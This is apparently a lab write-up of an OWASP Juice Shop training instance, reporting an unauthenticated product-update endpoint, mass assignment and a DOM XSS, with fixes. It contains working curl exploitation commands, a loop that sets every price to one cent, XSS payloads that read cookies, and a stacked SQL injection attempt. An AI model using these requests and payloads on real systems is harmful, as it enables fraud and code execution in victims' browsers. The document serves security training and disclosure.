# [CRITICAL] Broken Access Control — Unauthenticated Data Modification + DOM XSS

**Target:** OWASP Juice Shop v6.2.0-SNAPSHOT (local instance — training lab)
**Primary endpoint:** `PUT /api/Products/:id`
**Date:** 9 October 2026
**Researcher:** Twist
**Severity:** CRITICAL (Broken Access Control) + HIGH (DOM XSS)

---

## 1. Summary

The `PUT /api/Products/:id` endpoint **requires no authentication whatsoever**.
An attacker with no account can modify the **name, price, description, and
image** of the entire product catalogue.

Additionally: the search parameter `?q=` is rendered as raw HTML
(`bypassSecurityTrustHtml`) → **DOM XSS with confirmed JavaScript execution**.

Combined, an anonymous attacker can **corrupt the catalogue and execute code in
every visitor's browser**.

---

## 2. Impact

| Aspect | Detail |
|---|---|
| Authentication | **NOT required** — endpoint fully open |
| Products affected | **36 of 45** modified in **1.1 seconds** |
| Modifiable fields | name, price, deluxePrice, description, image |
| Financial impact | Any price can be set to `0.01` — buy anything for a cent |
| XSS | JavaScript executes in the victim's browser (confirmed) |
| Who can do it | **Anyone with network access** — no account needed |

**The lethal combination:** set prices to zero, then inject XSS into the page
every visitor sees.

---

## 3. Reproduction Steps

### Evidence 1 — Baseline (normal state)

```bash
curl -sS http://localhost:3000/api/Products/1
```
```json
{"status":"success","data":{"id":1,"name":"Apple Juice (1000ml)","price":1.99, ...}}
```

### Evidence 2 — Authorisation test across all write endpoints

```bash
for ep in "PUT /api/Products/1" "POST /api/Products" "DELETE /api/Products/45" \
          "PUT /api/Users/1" "DELETE /api/Users/24" "POST /rest/products/reviews"; do
  curl -sS -o /dev/null -w "%{http_code}  $ep\n" -X ${ep%% *} \
    "http://localhost:3000${ep#* }" -H "Content-Type: application/json" -d '{}'
done
```

**Result:**
```
200  PUT    /api/Products/1          ← OPEN (no auth!)
401  POST   /api/Products            ← correct, auth required
401  DELETE /api/Products/45         ← correct
401  PUT    /api/Users/1             ← correct
401  DELETE /api/Users/24            ← correct
401  POST   /rest/products/reviews   ← correct
```

**Finding:** one endpoint slipped past the authorisation middleware —
`PUT /api/Products/:id`. The pattern is unmistakable: every sibling route is
guarded, this one is not.

### Evidence 3 — Exploitation with no token (NO Authorization header)

```bash
curl -sS -X PUT http://localhost:3000/api/Products/1 \
  -H "Content-Type: application/json" \
  -d '{"description":"TAMPERED-BUT-NOAUTH"}'
```
```json
{"status":"success","data":{"id":1,"description":"TAMPERED-BUT-NOAUTH", ...}}
```

Verification:
```bash
curl -sS http://localhost:3000/api/Products/1 | python -c "import sys,json;print(json.load(sys.stdin)['data']['description'])"
# → TAMPERED-BUT-NOAUTH     ← actually persisted
```

### Evidence 4 — Mass assignment (sensitive fields included)

```bash
curl -sS -X PUT http://localhost:3000/api/Products/1 \
  -H "Content-Type: application/json" \
  -d '{"name":"HACKED-JUICE","price":0.01,"deluxePrice":0.01,
       "description":"<script>alert(1)</script>",
       "image":"http://evil.com/pwn.jpg"}'
```

| Field | Initial | After | Changed? |
|---|---|---|---|
| name | Apple Juice (1000ml) | HACKED-JUICE | ✅ |
| price | 1.99 | 0.01 | ✅ |
| deluxePrice | 1.49 | 0.01 | ✅ |
| description | (original text) | `<script>alert(1)</script>` | ✅ |
| image | assets/.../apple.jpg | http://evil.com/pwn.jpg | ✅ |

**No field whitelist** — every field sent is accepted verbatim (mass assignment).

### Evidence 5 — MASS TAMPER: entire catalogue in one second

```python
for pid in range(1, 46):
    PUT /api/Products/{pid}  {"price": 0.01}
```
```
successfully modified: 36/45 products   (1.1 seconds)
failed:                 9/45            (legacy products missing required fields)
```

**Impact evidence:**
```
id= 1  HACKED-JUICE                 price=0.01
id= 2  Orange Juice (1000ml)        price=0.01
id= 3  Eggfruit Juice (500ml)       price=0.01
id=24  Apple Pomace                 price=0.01
id=45  OWASP Juice Shop LEGO™ Tower price=0.01
```

### Evidence 6 — DOM XSS (confirmed execution in a real browser)

**Root cause — code that deliberately disables the sanitiser** (`main.js`):

```javascript
trustProductDescription(t){
  for(let i=0;i<t.length;i++)
    t[i].description = this.sanitizer.bypassSecurityTrustHtml(t[i].description)
}

// and for the search parameter:
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(t)
```

`bypassSecurityTrustHtml()` tells Angular: *"this HTML is safe, do not
sanitise it."* The template then renders it through `[innerHTML]`:

```javascript
ey('innerHTML', t.searchValue, Ww)
```

**Exploitation:**
```
http://localhost:3000/#/search?q=<img src=x onerror="alert(document.cookie)">
```

**Execution evidence (headless browser):**
```javascript
// payload: <img src=x onerror="window.__xss1=(window.__xss1||0)+1">
{
  "xss_executed": 2,
  "img_onerror_in_dom": 1,
  "searchValue_tag": "SPAN | innerHTML: <img src=\"x\" onerror=\"window.__xss1=...\">"
}
```

**`xss_executed: 2` — the JavaScript genuinely ran.** ✅

---

## 4. Root Cause

### 4.1 Authorisation middleware gap

The `PUT /api/Products/:id` endpoint is unprotected. The correct pattern
(Express):

```javascript
// WRONG — no guard
router.put('/:id', (req, res) => { ... });

// RIGHT — authentication + role check
const { authenticate, authorize } = require('../lib/security');

router.put('/:id',
  authenticate(),                    // valid token?
  authorize(['admin']),              // admin role?
  (req, res) => { ... }
);
```

**Root cause:** the route was registered directly to a handler with no
middleware. Every other route has `authenticate()` — this one was missed. A
configuration error, not a design flaw.

### 4.2 Mass assignment

```javascript
// WRONG — entire body accepted
await Product.update(req.body, { where: { id: req.params.id } });

// RIGHT — explicit field whitelist
const ALLOWED = ['name', 'description', 'image'];
const patch = Object.fromEntries(
  Object.entries(req.body).filter(([k]) => ALLOWED.includes(k))
);
await Product.update(patch, { where: { id: req.params.id } });
```

### 4.3 Sanitiser deliberately disabled

```javascript
// WRONG — opens the door to XSS
this.sanitizer.bypassSecurityTrustHtml(userControlledData)

// RIGHT — let Angular filter
// just: <div [innerHTML]="product.description"></div>
```

`bypassSecurityTrustHtml` is only for HTML that is **entirely
self-constructed** — never for user-supplied data.

---

## 5. Remediation

**1. Protect the endpoint (most urgent)**
```javascript
router.put('/:id', authenticate(), authorize(['admin']), handler);
```

**2. Whitelist fields**
```javascript
const FIELD_WHITELIST = ['name', 'description', 'image', 'price'];
```

**3. Never bypass the sanitiser for user input**
```javascript
// remove every bypassSecurityTrustHtml that touches user data
// plain [innerHTML] is sufficient → Angular filters automatically
```

**4. Centralised control — not per-route manual guards**
```javascript
// every write under /api/Products automatically requires admin
app.use('/api/Products', (req,res,next) => {
  if (['POST','PUT','PATCH','DELETE'].includes(req.method))
    return authenticate()(req,res, () => authorize(['admin'])(req,res,next));
  next();
});
```

**5. Helmet + CSP** — a strict CSP neutralises XSS even when the payload lands:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```
*(Note: this instance has no CSP header at all — see write-up 002 §5.)*

**6. Automated audit**
```bash
# find every write route missing middleware
grep -rnE "router\.(put|post|patch|delete)\(" routes/ | grep -v "authenticate"
```

---

## 6. Severity Comparison

| Finding | CVSS (approx) | Reasoning |
|---|---|---|
| PUT without auth | **9.1 CRITICAL** | Full data integrity, no authentication |
| Mass assignment | **8.6 HIGH** | Escalation from the above |
| DOM XSS (`?q=`) | **7.4 HIGH** | Confirmed JS execution, affects all visitors |

Chained together → **CRITICAL exploit chain**.

---

## 7. Corrections & Honesty (what was NOT proven)

```
✗ STORED XSS via description
  → payload <img onerror> WAS stored raw in the DB (verified)
  → but NO page renders description into the DOM
  → test result: stored_executed=0, img_payload_in_dom=0
  → therefore: data stored unsanitised (an integrity issue),
    BUT XSS is not proven. Do not overclaim in a report.

✗ SQLi WRITE via stacked query
  → "apple'; UPDATE Products SET price=0--"
  → response: SQLITE_ERROR: near ";": syntax error
  → driver uses all() which disallows multi-statement
  → SQLi on this endpoint is READ-ONLY

✗ Reflected XSS via a plain <script> tag
  → <script>alert(1)</script> is stored but does NOT execute
    (innerHTML does not run <script>)
  → requires <img onerror> or <iframe src=javascript:>
```

**Confirmed real: 2 vulnerabilities (broken access control + DOM XSS).**
Everything else: stored but non-executing — recorded as such.

---

## 8. Lessons Learned

**1. SQLi READ ≠ SQLi WRITE.**
Being able to `UNION SELECT` does not mean you can `UPDATE`. Check whether the
driver permits stacked queries first. If `;` is rejected, find another write path.

**2. Broken access control is more common than SQL injection.**
I initially went hunting for more SQL injection. The largest bug was a `PUT`
route someone forgot to protect. **Test authorisation first, injection second.**

**3. Read the source when it is available.**
`main.js` (1.2 MB) gave a definitive answer: `bypassSecurityTrustHtml`. No
guessing required — the code said it outright.

**4. `200 OK` is not proof.**
State change must be verified. I did: re-GET → the value had genuinely changed.

**5. Clean up after yourself.**
36 products were damaged → DB deleted and re-seeded → products restored.
Always restore the lab after testing.

---

## 9. Appendix

```
Root-cause code : main.js, trustProductDescription + searchValue
Damaged DB proof: writeups/evidence/tampered.sqlite
Execution proof : xss_executed=2 (headless browser, recorded)
Method          : curl (state) + headless browser (DOM XSS)
Lab             : local OWASP Juice Shop — restored after testing
```
